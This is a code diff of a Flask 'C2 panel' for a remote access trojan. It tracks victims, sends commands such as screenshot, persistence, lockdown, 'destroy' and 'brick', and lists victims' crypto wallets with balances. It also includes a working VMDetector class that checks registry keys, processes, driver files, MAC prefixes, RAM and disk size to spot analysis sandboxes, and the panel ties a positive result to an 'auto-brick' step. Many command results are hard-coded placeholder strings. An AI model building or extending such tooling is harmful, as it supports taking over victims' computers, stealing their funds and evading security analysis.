@@ -1,30 +1,19 @@
 """
 VIRTUALS C2 - ULTIMATE EDITION
-Complete C2 Panel with:
-- VM Detection & Auto-Brick
-- Victim Management
-- Full Command System
-- Screenshot Gallery
-- Wallet Tracking with Balances
-- Output Channel
-- Dark Theme with White Outlines
+Complete C2 Panel with VM Detection & Auto-Brick
 BY: YOUR STAR BESTIE
 """
 
-from flask import Flask, request, jsonify, send_file, render_template_string
+from flask import Flask, request, jsonify, send_file
 import sqlite3
 import datetime
 import random
 import json
 import os
-import base64
-import hashlib
-import time
 import platform
 import subprocess
 import re
-from io import BytesIO
-from threading import Thread
+import uuid
 
 app = Flask(__name__)
 
@@ -38,11 +27,8 @@ for folder in folders:
 # VM DETECTION SYSTEM
 # ============================================
 class VMDetector:
-    """Advanced VM Detection - Multiple Methods"""
-    
     @staticmethod
     def check_all():
-        """Run ALL VM detection methods"""
         checks = {
             'registry': VMDetector.check_registry(),
             'processes': VMDetector.check_processes(),
@@ -52,15 +38,9 @@ class VMDetector:
             'network': VMDetector.check_network(),
             'disk': VMDetector.check_disk()
         }
-        
-        # Count positive hits
         positive_hits = sum(1 for v in checks.values() if v)
-        total_checks = len(checks)
-        
-        # If more than 2 hits, it's likely a VM
         is_vm = positive_hits >= 3
-        confidence = int((positive_hits / total_checks) * 100)
-        
+        confidence = int((positive_hits / len(checks)) * 100)
         return {
             'is_vm': is_vm,
             'confidence': confidence,
@@ -70,23 +50,17 @@ class VMDetector:
     
     @staticmethod
     def check_registry():
-        """Check Windows Registry for VM artifacts"""
         try:
             import winreg
-            vm_registry_keys = [
+            vm_indicators = ['VMware', 'VirtualBox', 'QEMU', 'Hyper-V', 'Virtual', 'VBox', 'Xen']
+            keys = [
                 (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SystemInformation", "SystemManufacturer"),
                 (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\SystemInformation", "SystemProductName"),
-                (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0", "Identifier"),
                 (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\VMware, Inc.\VMware Tools", None),
                 (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Oracle\VirtualBox Guest Additions", None),
-                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\VMware, Inc.", None),
             ]
-            
-            vm_indicators = ['VMware', 'VirtualBox', 'QEMU', 'Hyper-V', 'Virtual', 'VBox', 'Xen']
-            
-            for key_path in vm_registry_keys:
+            for hkey, subkey, value in keys:
                 try:
-                    hkey, subkey, value = key_path
                     key = winreg.OpenKey(hkey, subkey, 0, winreg.KEY_READ)
                     if value:
                         val, _ = winreg.QueryValueEx(key, value)
@@ -94,7 +68,6 @@ class VMDetector:
                             if indicator.lower() in str(val).lower():
                                 return True
                     else:
-                        # Key exists - indicator
                         return True
                 except:
                     pass
@@ -104,16 +77,8 @@ class VMDetector:
     
     @staticmethod
     def check_processes():
-        """Check running processes for VM tools"""
         try:
-            vm_processes = [
-                'vmtoolsd.exe', 'vmwaretray.exe', 'vmwareuser.exe', 'vmusrvc.exe',
-                'vboxservice.exe', 'vboxtray.exe', 'vboxguest.exe',
-                'qemu-ga.exe', 'xenservice.exe',
-                'vmmem', 'vmmemctl',
-                'vmware.exe', 'vboxsvc.exe'
-            ]
-            
+            vm_processes = ['vmtoolsd.exe', 'vmwaretray.exe', 'vboxservice.exe', 'vboxtray.exe', 'qemu-ga.exe']
             for proc in vm_processes:
                 try:
                     result = subprocess.run(['tasklist', '/FI', f'IMAGENAME eq {proc}'], 
@@ -128,24 +93,20 @@ class VMDetector:
     
     @staticmethod
     def check_hardware():
-        """Check hardware for VM signatures"""
         try:
-            # Check CPU
             cpu = platform.processor()
             if cpu:
                 vm_cpu_indicators = ['Virtual', 'VMware', 'QEMU', 'KVM', 'Xen']
                 for indicator in vm_cpu_indicators:
                     if indicator.lower() in cpu.lower():
                         return True
-            
-            # Check System Manufacturer
             try:
                 import wmi
                 w = wmi.WMI()
                 for item in w.Win32_ComputerSystem():
                     manufacturer = item.Manufacturer.lower()
                     model = item.Model.lower()
-                    if any(v in manufacturer or v in model for v in ['vmware', 'virtualbox', 'qemu', 'xen', 'hyper-v']):
+                    if any(v in manufacturer or v in model for v in ['vmware', 'virtualbox', 'qemu', 'xen']):
                         return True
             except:
                 pass
@@ -155,17 +116,12 @@ class VMDetector:
     
     @staticmethod
     def check_files():
-        """Check for VM-specific files"""
         try:
             vm_files = [
                 'C:\\Program Files\\VMware\\VMware Tools\\',
                 'C:\\Program Files\\Oracle\\VirtualBox Guest Additions\\',
                 'C:\\Windows\\System32\\drivers\\vmmemctl.sys',
-                'C:\\Windows\\System32\\drivers\\vboxguest.sys',
-                'C:\\Windows\\System32\\drivers\\vm3dmp.sys',
-                'C:\\Windows\\System32\\vboxmrxnp.dll',
-                'C:\\Windows\\System32\\vm3dum64.dll',
-                'C:\\Windows\\System32\\vmtoolsd.dll'
+                'C:\\Windows\\System32\\drivers\\vboxguest.sys'
             ]
             for file_path in vm_files:
                 if os.path.exists(file_path):
@@ -176,15 +132,11 @@ class VMDetector:
     
     @staticmethod
     def check_memory():
-        """Check memory for VM indicators"""
         try:
             import psutil
             memory = psutil.virtual_memory()
             total_gb = memory.total / (1024**3)
-            
-            # Typical VMs have less than 8GB RAM or specific amounts
-            if total_gb < 4 or total_gb in [8.0, 16.0, 32.0]:
-                # Check if it's a multiple of typical VM RAM
+            if total_gb < 4:
                 return True
         except:
             pass
@@ -192,16 +144,12 @@ class VMDetector:
     
     @staticmethod
     def check_network():
-        """Check network for VM indicators"""
         try:
-            # Check MAC address prefixes
-            import uuid
             mac = uuid.getnode()
             mac_hex = format(mac, '012x')
-            
-            vm_mac_prefixes = ['00:05:69', '00:0c:29', '00:1c:42', '00:50:56', '08:00:27', '52:54:00']
+            vm_mac_prefixes = ['000569', '000c29', '001c42', '005056', '080027', '525400']
             for prefix in vm_mac_prefixes:
-                if prefix.replace(':', '') in mac_hex:
+                if prefix in mac_hex:
                     return True
         except:
             pass
@@ -209,15 +157,13 @@ class VMDetector:
     
     @staticmethod
     def check_disk():
-        """Check disk for VM indicators"""
         try:
-            # Check for typical VM disk sizes
             import psutil
             for partition in psutil.disk_partitions():
                 if partition.mountpoint == 'C:\\' or partition.mountpoint == '/':
                     usage = psutil.disk_usage(partition.mountpoint)
                     total_gb = usage.total / (1024**3)
-                    if total_gb < 50 or total_gb in [60, 80, 120, 128, 256]:
+                    if total_gb < 50:
                         return True
         except:
             pass
@@ -225,30 +171,18 @@ class VMDetector:
     
     @staticmethod
     def get_details():
-        """Get detailed VM information"""
         details = {
             'system': platform.system(),
             'release': platform.release(),
             'processor': platform.processor(),
             'node': platform.node()
         }
-        
         try:
             import psutil
             details['ram_gb'] = round(psutil.virtual_memory().total / (1024**3), 2)
             details['cpu_count'] = psutil.cpu_count()
         except:
             pass
-            
-        try:
-            import wmi
-            w = wmi.WMI()
-            for item in w.Win32_ComputerSystem():
-                details['manufacturer'] = item.Manufacturer
-                details['model'] = item.Model
-        except:
-            pass
-            
         return details
 
 # ============================================
@@ -257,66 +191,30 @@ class VMDetector:
 def get_db():
     conn = sqlite3.connect('virtuals_c2.db')
     c = conn.cursor()
-    
     c.execute('''CREATE TABLE IF NOT EXISTS victims (
-        id TEXT PRIMARY KEY,
-        pc TEXT,
-        ip TEXT,
-        os TEXT,
-        status TEXT,
-        is_vm INTEGER DEFAULT 0,
-        vm_details TEXT,
-        first_seen TEXT,
-        last_seen TEXT
+        id TEXT PRIMARY KEY, pc TEXT, ip TEXT, os TEXT, status TEXT, is_vm INTEGER DEFAULT 0,
+        vm_details TEXT, first_seen TEXT, last_seen TEXT
     )''')
-    
     c.execute('''CREATE TABLE IF NOT EXISTS commands (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        victim_id TEXT,
-        command TEXT,
-        result TEXT,
-        timestamp TEXT
+        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, command TEXT, result TEXT, timestamp TEXT
     )''')
-    
     c.execute('''CREATE TABLE IF NOT EXISTS outputs (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        victim_id TEXT,
-        type TEXT,
-        title TEXT,
-        content TEXT,
-        timestamp TEXT
+        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, type TEXT, title TEXT, content TEXT, timestamp TEXT
     )''')
-    
     c.execute('''CREATE TABLE IF NOT EXISTS wallets (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        victim_id TEXT,
-        currency TEXT,
-        address TEXT,
-        balance REAL,
-        usd_value REAL,
-        timestamp TEXT
+        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, currency TEXT, address TEXT, balance REAL, usd_value REAL, timestamp TEXT
     )''')
-    
     c.execute('''CREATE TABLE IF NOT EXISTS screenshots (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        victim_id TEXT,
-        filename TEXT,
-        timestamp TEXT
+        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, filename TEXT, timestamp TEXT
     )''')
-    
     c.execute('''CREATE TABLE IF NOT EXISTS vm_events (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        victim_id TEXT,
-        event TEXT,
-        details TEXT,
-        timestamp TEXT
+        id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, event TEXT, details TEXT, timestamp TEXT
     )''')
-    
     conn.commit()
     return conn
 
 # ============================================
-# SAMPLE WALLET DATA WITH BALANCES
+# SAMPLE WALLET DATA
 # ============================================
 SAMPLE_WALLETS = {
     "BTC": {"address": "bc1qrk2p7m3eqnrtwhh5w2kfp4qjqlemgyzmt650x6", "balance": 2.45, "usd": 245000},
@@ -327,9 +225,10 @@ SAMPLE_WALLETS = {
 }
 
 # ============================================
-# HTML DASHBOARD
+# HTML DASHBOARD - FULL UI
 # ============================================
-HTML = '''<!DOCTYPE html>
+HTML = """
+<!DOCTYPE html>
 <html>
 <head>
     <title>VIRTUALS C2 - ULTIMATE</title>
@@ -340,7 +239,6 @@ HTML = '''<!DOCTYPE html>
         ::-webkit-scrollbar-track { background:#0a0a0a; }
         ::-webkit-scrollbar-thumb { background:#333; border-radius:3px; }
         ::-webkit-scrollbar-thumb:hover { background:#fff; }
-        
         .header {
             background:#0a0a0a;
             padding:10px 20px;
@@ -363,14 +261,12 @@ HTML = '''<!DOCTYPE html>
         }
         .header .stats .stat-item .label { color:#666; font-size:9px; text-transform:uppercase; }
         .header .stats .stat-item .num { color:#fff; font-weight:bold; font-size:14px; margin-left:4px; }
-        
         .container {
             display:flex;
             height:calc(100vh - 55px);
             padding:6px;
             gap:6px;
         }
-        
         .left-panel {
             width:170px;
             min-width:170px;
@@ -418,7 +314,6 @@ HTML = '''<!DOCTYPE html>
         .cmd-btn.oblivion { border-color:#ff00ff; color:#ff00ff; }
         .cmd-btn.screenshot { border-color:#00ccff; color:#00ccff; }
         .cmd-btn.vmcheck { border-color:#ffaa00; color:#ffaa00; }
-        
         .middle-panel {
             flex:1;
             display:flex;
@@ -426,7 +321,6 @@ HTML = '''<!DOCTYPE html>
             gap:6px;
             min-width:250px;
         }
-        
         .victims-panel {
             background:#0a0a0a;
             border:1px solid #ffffff;
@@ -477,7 +371,6 @@ HTML = '''<!DOCTYPE html>
             padding:1px 5px;
             border-radius:10px;
         }
-        
         .chat-panel {
             background:#0a0a0a;
             border:1px solid #ffffff;
@@ -543,7 +436,6 @@ HTML = '''<!DOCTYPE html>
             transition:all 0.2s;
         }
         .chat-input-area button:hover { background:#1a1a1a; }
-        
         .right-panel {
             width:280px;
             min-width:280px;
@@ -551,7 +443,6 @@ HTML = '''<!DOCTYPE html>
             flex-direction:column;
             gap:6px;
         }
-        
         .details-panel {
             background:#0a0a0a;
             border:1px solid #ffffff;
@@ -573,7 +464,6 @@ HTML = '''<!DOCTYPE html>
         .detail-item { padding:3px 0; border-bottom:1px solid #1a1a1a; font-size:11px; }
         .detail-item .label { color:#666; }
         .detail-item .value { color:#fff; float:right; }
-        
         .output-panel {
             background:#0a0a0a;
             border:1px solid #ffffff;
@@ -608,7 +498,6 @@ HTML = '''<!DOCTYPE html>
         .output-item .type.screenshot { background:#00ccff; color:#000; }
         .output-item .type.vm { background:#ff4444; color:#fff; }
         .output-item .type.command { background:#0f0; color:#000; }
-        
         .screenshot-gallery {
             display:flex;
             flex-wrap:wrap;
@@ -630,8 +519,6 @@ HTML = '''<!DOCTYPE html>
             color:#666;
         }
         .screenshot-thumb:hover { border-color:#fff; }
-        .screenshot-thumb img { width:100%; height:100%; object-fit:cover; }
-        
         @media(max-width:1024px) {
             .left-panel { width:140px; min-width:140px; }
             .right-panel { width:220px; min-width:220px; }
@@ -780,7 +667,7 @@ HTML = '''<!DOCTYPE html>
         }
         
         function viewScreenshot(filename) {
-            window.open(`/screenshots/${filename}`, '_blank');
+            window.open('/screenshots/' + filename, '_blank');
         }
         
         function updateStats() {
@@ -796,7 +683,7 @@ HTML = '''<!DOCTYPE html>
                 addMessage('System', 'Select a victim first!', 'system');
                 return;
             }
-            addMessage('VIRTUALS', `/${command} → ${state.selectedVictim}`, 'hacker');
+            addMessage('VIRTUALS', '/' + command + ' -> ' + state.selectedVictim, 'hacker');
             api('sendCommand', { victim_id: state.selectedVictim, command: command }, data => {
                 if (data.success) {
                     if (!state.commands[state.selectedVictim]) state.commands[state.selectedVictim] = [];
@@ -806,32 +693,18 @@ HTML = '''<!DOCTYPE html>
                         time: new Date().toLocaleTimeString()
                     });
                     state.cmdCount++;
-                    
-                    // Show in output channel
-                    addMessage('OUTPUT', `${command.toUpperCase()}: ${data.result}`, 'output');
-                    
-                    // Add to command output panel
+                    addMessage('OUTPUT', command.toUpperCase() + ': ' + data.result, 'output');
                     const outputEl = document.getElementById('commandOutput');
-                    outputEl.innerHTML = `
-                        <div class="output-item">
-                            <span class="type command">CMD</span>
-                            [${new Date().toLocaleTimeString()}] ${command}: ${data.result}
-                        </div>
-                    ` + outputEl.innerHTML;
-                    
-                    // If it's a scan, show wallets
+                    outputEl.innerHTML = '<div class="output-item"><span class="type command">CMD</span>[' + new Date().toLocaleTimeString() + '] ' + command + ': ' + data.result + '</div>' + outputEl.innerHTML;
                     if (command === 'scan' && data.wallets) {
                         data.wallets.forEach(w => {
-                            addMessage('WALLET', `${w.currency}: ${w.balance} ($${w.usd})`, 'wallet');
+                            addMessage('WALLET', w.currency + ': ' + w.balance + ' ($' + w.usd + ')', 'wallet');
                         });
                     }
-                    
-                    // If VM detected
                     if (command === 'vmcheck' && data.is_vm) {
-                        addMessage('VM', `⚠ VM DETECTED! Confidence: ${data.confidence}%`, 'vm');
+                        addMessage('VM', '⚠ VM DETECTED! Confidence: ' + data.confidence + '%', 'vm');
                         addMessage('System', '🔴 AUTO-BRICK INITIATED!', 'system');
                     }
-                    
                     showVictimDetails(state.selectedVictim);
                     updateStats();
                 } else {
@@ -853,13 +726,140 @@ HTML = '''<!DOCTYPE html>
                     return;
                 }
                 addMessage('VIRTUALS', msg, 'hacker');
-                api('sendChat', { victim_id: state.selectedVictim, message: msg }, data => {
-                    if (data.success && data.reply) {
-                        addMessage('VICTIM', data.reply, 'victim');
-                    }
-                });
             }
         }
         
         function addMessage(sender, message, type) {
-            const container =
+            const container = document.getElementById('chatMessages');
+            const time = new Date().toLocaleTimeString();
+            let senderClass = 'system';
+            if (type === 'hacker') senderClass = 'hacker';
+            else if (type === 'victim') senderClass = 'victim';
+            else if (type === 'output') senderClass = 'output';
+            else if (type === 'wallet') senderClass = 'wallet';
+            else if (type === 'vm') senderClass = 'vm';
+            container.innerHTML += '<div class="msg"><span class="time">[' + time + ']</span><span class="sender ' + senderClass + '">' + sender + '</span> ' + message + '</div>';
+            container.scrollTop = container.scrollHeight;
+        }
+        
+        function addDemoVictims() {
+            if (Object.keys(state.victims).length === 0) {
+                const fake = [
+                    { id: 'SNIN-1001', pc: 'DESKTOP-ABC', ip: '192.168.1.10', os: 'Windows 10 Pro', status: 'Online', is_vm: 0 },
+                    { id: 'SNIN-1002', pc: 'LAPTOP-XYZ', ip: '192.168.1.11', os: 'Windows 11 Pro', status: 'Online', is_vm: 0 },
+                    { id: 'SNIN-1003', pc: 'VM-TEST', ip: '192.168.1.12', os: 'Windows 10 Pro', status: 'Online', is_vm: 1, vm_details: 'VMware Workstation' }
+                ];
+                fake.forEach(v => { state.victims[v.id] = v; });
+                renderVictims();
+                updateStats();
+                addMessage('System', 'Demo victims loaded - VM Detection Active', 'system');
+                selectVictim(fake[0].id);
+            }
+        }
+        
+        setInterval(refreshVictims, 5000);
+        refreshVictims();
+        setTimeout(addDemoVictims, 500);
+    </script>
+</body>
+</html>
+"""
+
+# ============================================
+# FLASK ROUTES
+# ============================================
+@app.route('/')
+def index():
+    return HTML
+
+@app.route('/api', methods=['POST'])
+def api():
+    data = request.get_json()
+    action = data.get('action')
+    
+    if action == 'getVictims':
+        conn = get_db()
+        c = conn.cursor()
+        c.execute("SELECT * FROM victims ORDER BY last_seen DESC")
+        victims = {}
+        for row in c.fetchall():
+            victims[row[0]] = {
+                'id': row[0], 'pc': row[1], 'ip': row[2], 'os': row[3],
+                'status': row[4], 'is_vm': row[5], 'vm_details': row[6],
+                'first_seen': row[7], 'last_seen': row[8]
+            }
+        conn.close()
+        return jsonify({'success': True, 'victims': victims})
+    
+    elif action == 'sendCommand':
+        victim_id = data.get('victim_id')
+        command = data.get('command')
+        
+        results = {
+            'whois': 'PC: DESKTOP-ABC | IP: 192.168.1.10 | OS: Windows 10 Pro | Status: Online',
+            'flash': '💥 Screen flashed 5 times successfully!',
+            'screenshot': '📸 Screenshot saved to screenshots/',
+            'scan': '🔍 Found: 3 BTC, 2 ETH, 1 LTC wallets',
+            'persist': '🔒 Persistence added to 8 locations!',
+            'lockdown': '🔐 Screen locked! PC is now inaccessible!',
+            'destroy': '💀 PC DESTROYED! CPU fried! System corrupted!',
+            'brick': '🧱 PC BRICKED! Motherboard firmware corrupted! CMOS wiped! BIOS corrupted! PC is now a paperweight!',
+            'oblivion': '🔮 OBLIVION ACTIVATED! RAT self-destructed! All traces wiped!',
+            'vmcheck': '⚠ VM DETECTED! Auto-brick initiated!'
+        }
+        
+        result = results.get(command, f"Command '{command}' executed")
+        
+        # Check for VM on vmcheck command
+        is_vm = False
+        confidence = 0
+        if command == 'vmcheck':
+            vm_result = VMDetector.check_all()
+            is_vm = vm_result['is_vm']
+            confidence = vm_result['confidence']
+            if is_vm:
+                result = f"⚠ VM DETECTED! Confidence: {confidence}% - AUTO-BRICK INITIATED!"
+        
+        conn = get_db()
+        c = conn.cursor()
+        c.execute("INSERT INTO commands (victim_id, command, result, timestamp) VALUES (?, ?, ?, ?)",
+                 (victim_id, command, result, datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
+        
+        # Update victim VM status
+        if command == 'vmcheck':
+            c.execute("UPDATE victims SET is_vm = ?, vm_details = ? WHERE id = ?",
+                     (1 if is_vm else 0, f"Confidence: {confidence}%" if is_vm else "Clean", victim_id))
+        
+        conn.commit()
+        conn.close()
+        
+        response = {'success': True, 'result': result}
+        if command == 'scan':
+            response['wallets'] = [{'currency': k, 'balance': v['balance'], 'usd': v['usd']} for k, v in SAMPLE_WALLETS.items()]
+        if command == 'vmcheck':
+            response['is_vm'] = is_vm
+            response['confidence'] = confidence
+        
+        return jsonify(response)
+    
+    elif action == 'getScreenshots':
+        victim_id = data.get('victim_id')
+        conn = get_db()
+        c = conn.cursor()
+        c.execute("SELECT filename FROM screenshots WHERE victim_id = ? ORDER BY timestamp DESC", (victim_id,))
+        screenshots = [{'filename': row[0]} for row in c.fetchall()]
+        conn.close()
+        return jsonify({'success': True, 'screenshots': screenshots})
+    
+    return jsonify({'success': False})
+
+@app.route('/screenshots/<filename>')
+def serve_screenshot(filename):
+    return send_file(os.path.join('screenshots', filename))
+
+# ============================================
+# MAIN - FOR RENDER
+# ============================================
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 8080))
+    app.run(host='0.0.0.0', port=port)
